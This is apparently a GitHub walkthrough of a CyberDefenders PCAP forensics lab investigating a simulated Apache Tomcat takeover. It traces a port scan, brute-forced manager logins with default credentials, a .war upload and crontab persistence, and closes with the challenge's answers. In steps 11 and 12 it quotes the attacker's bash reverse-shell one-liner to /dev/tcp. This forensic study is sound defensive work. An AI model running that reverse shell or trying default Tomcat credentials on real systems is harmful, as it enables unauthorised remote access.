# 🐱 Tomcat Take Over Lab – CyberDefenders Walkthrough

This project is a full investigation of the **Tomcat Take Over** PCAP challenge on [CyberDefenders.org](https://cyberdefenders.org). It simulates a real-world web server compromise via Apache Tomcat.

I have documented each step I took in this repo to represent the steps I used to analyze and investigate the PCAP file, extract evidence, and answer key forensic questions.

![Scenario](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/1-1.png?raw=true)

---

## 🛠️ Tools Used

- **Wireshark** – PCAP packet analysis  
- **CyberChef** – Base64 decoding  
- **AbuseIPDB** – IP geolocation  
- **Notepad** – File inspection  
- **PowerShell** – File hashing  
- **Google / OSINT** – Tomcat version lookup  
- **ChatGPT** – Reverse shell decoding  

---

## 🧪 Analysis Steps

### 1. Initial Review in Wireshark  
![Wireshark](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/2-1.png?raw=true)

![Noted](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/4-1.png?raw=true)

Opened the PCAP and noted time range: 14 minutes and 30 seconds. Total packets captured: **21,070**.

---

### 2. Protocol & Traffic Overview  
![Protocol-Hierarchy](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/5-1.png?raw=true)  

![Conversations](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/6-1.png?raw=true)

Analyzed Protocol Hierarchy and Conversation statistics. Noted key IP pair: `14.0.0.120 ↔ 10.0.0.112` as top 'talker'.

---

### 3. Port Activity & Suspicious Files  

![Ports](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/7-1.png?raw=true)

![PDFs](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/8-1.png?raw=true)

![Hashed-file1](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/9-2.png?raw=true)

Observed traffic on ports: **8080, 22, 445, 80, 443**. Identified two PDFs: `work_request2024.pdf` – hashed and verified via VirusTotal.

---

### 4. SSH and HTTP Activity  
![SSH-Activity](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/10-1.png?raw=true) 

![HTTP-Activity](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/11-1.png?raw=true)

Noted early SSH packets (starting at packet 137), first HTTP activity from packet 685. Followed the HTTP stream.

---

### 5. Signs of SYN Scan  

![SYN-Scan](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/14-1.png?raw=true)  

IP `14.0.0.120` displayed numerous SYN requests — likely performing a port scan.

---

### 6. Identifying Open Ports  

![Open-ports](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/15-1.png?raw=true)  

I discovered pen ports on Apache Tomcat server: **22, 8080, 8009**.

---

### 7. POST Requests and File Upload  

![POST](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/15-1.png?raw=true)  

![POST-HTTP-Stream](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/18-1.png?raw=true)

Spotted suspicious POST with `.war` file named `JXQOZY.war`, indicated by ZIP header (PK).

---

### 8. Tomcat Admin Access Attempt 

![401/Get](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/19-2.png?raw=true)  

HTTP 401 errors and repeated `GET` requests to `/manager/html` endpoint , I realized this was a login page and there is an indication of brute-force login attempts.

---

### 9. Decoding Credentials  

![Authorization-Code](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/22-1.png?raw=true)  

![CyberChef](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/22-2.png?raw=true)

Decoded base64 strings like `YWRtaW46YWRtaW4=` with CyberChef – revealed default credentials like `admin:admin`. This confirmed my brute force suspicions.

---

### 10. Successful Login  

![Successful](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/23-1.png?raw=true)  

Found successful login with credentials `admin:tomcat`.

---

### 11. Execution of Reverse Shell  

![Shell-execution](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/25-2.png?raw=true)  

Discovered shell execution command:  
`/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`

---

### 12. Crontab Entry for Persistence  

![Port-execution](https://github.com/mbergin123/Tomcat-Takeover-Lab/blob/main/images/26-1.png?raw=true) 

I was unfamiliar with this command ‘/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" so I used the help of ChatGPT. Post-exploitation behavior included a scheduled crontab task for maintaining access.

---

## 🧩 Challenge Questions & Answers

1. **Attacker's IP Address:** `14.0.0.120`  
2. **Origin Country:** China (verified via AbuseIPDB)  
3. **Port for Admin Panel:** `8080`  
4. **Enumeration Tool Used:** Gobuster (`user-agent: gobuster/3.6`)  
5. **Admin Directory Discovered:** `/manager/html`  
6. **Successful Login Credentials:** `admin:tomcat`  
7. **Malicious File Name:** `JXQOZY.war`  
8. **Persistence Mechanism:** Crontab entry running a reverse shell command

---

## ✅ Conclusion

This lab simulated an end-to-end web server compromise through Apache Tomcat. The attacker performed a scan, brute-forced admin credentials, uploaded a `.war` reverse shell, and established persistence. Each step was documented with evidence from the PCAP file.

This project strengthened my skills in packet analysis, threat detection, and red team methodology — with a strong focus on documentation and forensic accuracy.

---

